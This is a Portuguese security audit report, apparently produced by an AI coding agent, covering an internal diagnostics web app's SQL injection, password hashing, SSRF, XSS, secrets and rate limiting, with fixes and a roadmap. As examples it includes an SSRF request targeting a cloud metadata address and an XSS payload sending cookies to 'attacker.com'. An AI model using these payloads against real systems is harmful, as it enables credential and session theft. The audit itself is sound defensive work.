# Plano de Segurança — Speed Teste DBSync

**Data da auditoria:** 2026-06-24  
**Versão auditada:** deploy `dpl_DAX958AJPCULDHCEWfvf49cpvqTA`  
**Escopo:** Branch `teste` / produção (`grupodb-speed.vercel.app`)

---

## Resumo Executivo

| # | Categoria | Status | Severidade | Arquivo/Linha |
|---|---|---|---|---|
| 1 | SQL Injection | ✅ OK | OK | — |
| 2 | Armazenamento de Senhas | ⚠️ SHA-256 sem salt | MÉDIA | `api/_db.js:20`, `assets/js/storage/users.js:17` |
| 3 | Autenticação e Sessão | ⚠️ Sem rate limit + token fallback | ALTA | `assets/js/auth/session.js:112`, `api/login.js` |
| 4 | Autorização | ❌ Proxy sem autenticação (SSRF) | CRÍTICA | `api/proxy.js:8` |
| 5 | XSS | ⚠️ innerHTML sem sanitização | MÉDIA | `assets/js/ui/renderer.js:3125` (+22 ocorrências) |
| 6 | CSRF | ✅ JWT mitiga (não cookie) | OK | — |
| 7 | Dados Sensíveis | ⚠️ GET /api/users público + erros expostos | MÉDIA | `api/users.js:36`, `api/_db.js:22` |
| 8 | Secrets | ⚠️ JWT secret com fallback hardcoded | ALTA | `api/_db.js:22` |
| 9 | Dependências | ✅ 0 vulnerabilidades | OK | — |
| 10 | Rate Limiting | ❌ Nenhum limite de requisições | ALTA | `api/login.js` (todos os endpoints) |

---

## Detalhamento por Item

### 1. SQL Injection — OK

Todas as queries usam prepared statements com `args: [...]` e `?` como placeholders via `@libsql/client`. Nenhuma concatenação de input de usuário em SQL detectada.

O template literal em `UPDATE ... SET ${fields.join(', ')}` é seguro porque `fields` é construído a partir de nomes de colunas hardcoded no código, não de input externo.

**Ação requerida:** Nenhuma.

---

### 2. Armazenamento de Senhas — MÉDIA

**Problema:** SHA-256 é um hash criptográfico de propósito geral, rápido e sem salt. Não é adequado para senhas.

- Servidor: `api/_db.js:20` — `crypto.createHash('sha256').update(str, 'utf8').digest('hex')`
- Cliente: `assets/js/storage/users.js:17` — `crypto.subtle.digest('SHA-256', ...)`

**Riscos:**
- Sem salt: hashes iguais para senhas iguais → rainbow table attacks
- SHA-256 é ~10 bilhões de hashes/segundo com GPU moderna → brute-force viável
- Hashing no client-side significa que o hash IS a senha no servidor

**Correção recomendada:**
```
Migrar para bcrypt (custo 12+) ou argon2id no servidor.
Implementar salt único por usuário armazenado junto com o hash.
Exigir nova senha de todos os usuários após a migração.
```

**Ação requerida:** Planejada para próxima iteração. Requer migração de todos os usuários.

---

### 3. Autenticação e Sessão — ALTA

**Problema A: Sem rate limiting no login**

`api/login.js` aceita tentativas ilimitadas de login. Um atacante pode automatizar brute-force sem qualquer bloqueio.

**Correção:**
```javascript
// Opção 1: Contador de falhas no Turso
// Na tabela users: loginFailures INTEGER DEFAULT 0, lockedUntil TEXT
// Bloquear após 5 falhas por 15 minutos

// Opção 2: Vercel Edge Middleware (vercel.json)
// Rate limit: max 10 req/min por IP em /api/login
```

**Problema B: Token de fallback não-JWT**

`assets/js/auth/session.js:112` — quando o login ocorre via fallback local (sem API), `_generateToken()` gera uma string aleatória de 32 chars. Esta string é truthy mas falha na verificação JWT do servidor, causando bugs silenciosos.

```javascript
// Linha 112 atual:
token: jwtToken || _generateToken()

// Problema: _generateToken() retorna "aBcDeFgH..." — não é um JWT
// SessionManager.getToken() retorna essa string
// APIs que verificam JWT recebem token inválido → 403
```

**Correção:**
```javascript
// Diferenciar claramente tokens locais de JWTs
token: jwtToken || null,       // null se não há JWT
hasJwt: !!jwtToken
// APIs verificam session.hasJwt antes de usar getToken()
```

**Ação requerida:** Alta prioridade. Bugs já observados em produção (loop de senha temporária).

---

### 4. Autorização — CRÍTICA

**Problema A: `/api/proxy.js` sem autenticação (SSRF)**

`api/proxy.js` não verifica JWT. Qualquer pessoa na internet (sem login) pode:

```http
POST /api/proxy
{
  "targetUrl": "http://169.254.169.254/latest/meta-data/",
  "payload": "<test/>"
}
```

Vetores de ataque:
- **SSRF para AWS metadata** (169.254.169.254) — pode expor credenciais da instância Vercel
- **Port scanning** de infraestrutura interna
- **Proxy anônimo** para requisições maliciosas usando a infraestrutura do Grupo DB
- **Amplification** — usar o servidor para atacar terceiros

**Correção imediata:**
```javascript
// api/proxy.js — adicionar no início do handler:
const authPayload = getAuthPayload(req);
if (!authPayload) return res.status(401).json({ error: 'Autenticação obrigatória' });

// Validar targetUrl contra whitelist:
const ALLOWED_DOMAINS = [
  'wsmb.diagnosticosdobrasil.com.br',
  'wsmp.diagnosticosdobrasil.com.br'
];
const { hostname } = new URL(targetUrl);
if (!ALLOWED_DOMAINS.includes(hostname)) {
  return res.status(403).json({ error: 'Domínio não autorizado' });
}
```

**Problema B: Autorização insuficiente em grupos/métodos**

`api/groups/[id].js:62` (e equivalentes) — qualquer usuário autenticado (não apenas admin) podia deletar grupos e métodos. Corrigido na versão atual para exigir `nivel === 'admin'`.

**Ação requerida:** CRÍTICA — corrigir proxy.js urgentemente.

---

### 5. XSS (Cross-Site Scripting) — MÉDIA

**23 ocorrências de `innerHTML =`** detectadas em 5 arquivos.

Exemplo de risco em `assets/js/ui/renderer.js:3125`:
```javascript
progressDiv.innerHTML = `<span class="badge info">${profile.nome}: ...`
```

`profile.nome` vem do Turso (inserido por um admin). Se um admin cadastrar:
```
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
```
O código executa no browser de qualquer usuário que visualize o progresso de execução.

**Risco prático:** Baixo — apenas admins podem cadastrar perfis, e todos os usuários são internos.  
**Risco teórico:** Médio — account takeover se um admin for comprometido.

**Correção recomendada:**
```javascript
// Adicionar função de sanitização em utils.js:
const escapeHTML = (str) => {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
};

// Usar em todos os innerHTML com dados de usuário:
progressDiv.innerHTML = `<span>${escapeHTML(profile.nome)}: ...`
```

Ou adicionar [DOMPurify](https://github.com/cure53/DOMPurify) como dependência.

**Ação requerida:** Média prioridade. Implementar `escapeHTML` e aplicar em todos os `innerHTML` com dados externos.

---

### 6. CSRF — OK

Endpoints de mutação usam `Authorization: Bearer <jwt>` no header, não cookies. O browser não envia headers customizados automaticamente em requisições cross-origin, então CSRF clássico não se aplica. ✅

---

### 7. Exposição de Dados Sensíveis — MÉDIA

**Problema A: `GET /api/users` é público**

`api/users.js:36` — retorna nome, email, usuário e nível de acesso de todos os usuários sem qualquer autenticação.

**Correção:**
```javascript
// Adicionar verificação JWT no GET:
if (req.method === 'GET') {
  const payload = getAuthPayload(req);
  if (!payload) return res.status(401).json({ error: 'Não autenticado' });
  // ... resto do handler
}
```

**Problema B: Mensagens de erro internas expostas**

`return res.status(500).json({ error: err.message })` — expõe mensagens de erro do libSQL/Turso ao cliente, que podem revelar estrutura do banco ou detalhes de configuração.

**Correção:**
```javascript
// Log interno + mensagem genérica ao cliente:
console.error('[api/users] DB error:', err);
return res.status(500).json({ error: 'Erro interno do servidor' });
```

**Problema C: Fallback de JWT secret no código-fonte**

`api/_db.js:22`:
```javascript
const _secret = () => process.env.JWT_SECRET || 'stp-dev-secret-altere-em-producao';
```

Se `JWT_SECRET` não estiver configurado no Vercel, qualquer pessoa que leia o código-fonte pode forjar JWTs válidos.

**Correção:**
```javascript
const _secret = () => {
  const s = process.env.JWT_SECRET;
  if (!s) throw new Error('JWT_SECRET não configurado');
  return s;
};
```

**Ação requerida:** Verificar que JWT_SECRET está configurado no Vercel. Remover o fallback hardcoded.

---

### 8. Secrets e Variáveis de Ambiente — ALTA

**Problema: JWT secret hardcoded como fallback**

Ver item 7-C acima.

**Problema: Sem `.gitignore`**

Não há `.gitignore` no repositório. Se um arquivo `.env` for criado localmente e commitado por acidente, as credenciais do Turso e JWT_SECRET ficariam expostas no histórico do git.

**Correção:**
```
# Criar .gitignore na raiz:
.env
.env.local
.env*.local
node_modules/
.vercel/
```

**Ação requerida:** Criar `.gitignore` imediatamente. Verificar histórico de commits por secrets acidentais.

---

### 9. Dependências — OK

```
npm audit → found 0 vulnerabilities
```

Dependências: `@libsql/client`, `xlsx`, `chart.js`. Nenhuma vulnerabilidade conhecida na versão auditada.

**Ação requerida:** Executar `npm audit` antes de cada deploy. Manter dependências atualizadas.

---

### 10. Rate Limiting — ALTA

**Problema:** Nenhum endpoint possui rate limiting. O endpoint `/api/login` aceita tentativas ilimitadas.

Com SHA-256 (hash rápido) e sem limite de tentativas, um ataque de brute-force automatizado é viável.

**Opção 1 — Vercel Edge Middleware (recomendado):**
```javascript
// middleware.js na raiz do projeto:
import { NextResponse } from 'next/server';
// Rate limit: 10 req/min por IP em /api/login
```

**Opção 2 — Contador no Turso:**
```sql
ALTER TABLE users ADD COLUMN loginFailures INTEGER DEFAULT 0;
ALTER TABLE users ADD COLUMN lockedUntil TEXT;
```
```javascript
// Em api/login.js: bloquear após 5 falhas consecutivas por 15 minutos
```

**Opção 3 — Serviço externo:**
Cloudflare, Upstash Rate Limit, ou similar na frente do Vercel.

**Ação requerida:** Alta prioridade. Implementar pelo menos bloqueio por IP via Vercel Middleware.

---

## Roadmap de Correção

### Imediato (esta semana)
- [ ] **#4 CRÍTICO** — Adicionar autenticação JWT e whitelist de domínios em `api/proxy.js`
- [ ] **#8** — Criar `.gitignore`; remover fallback hardcoded do JWT secret em `api/_db.js:22`
- [ ] **#7-A** — Exigir JWT no `GET /api/users`

### Curto prazo (próximas 2 semanas)
- [ ] **#3/10** — Rate limiting no login (Vercel Middleware ou contador Turso)
- [ ] **#5** — Implementar `escapeHTML` e aplicar em todos os `innerHTML` com dados externos
- [ ] **#7-B** — Substituir `err.message` por mensagem genérica em respostas 500

### Médio prazo (próximo mês)
- [ ] **#2** — Migrar hashing de senhas de SHA-256 para argon2id com salt
- [ ] **#3-B** — Refatorar `SessionManager` para diferenciar JWT real de token local

---

## Notas Adicionais

**Contexto de uso:** Ferramenta interna do Grupo DB — Medicina Diagnóstica. Usuários são funcionários internos. O risco prático de ataques externos é menor que em sistemas públicos, mas a exposição do proxy (SSRF) é crítica independentemente do contexto.

**Auditoria realizada por:** Claude Code (Anthropic) — análise estática do código-fonte  
**Próxima revisão sugerida:** Após implementação das correções críticas e altas
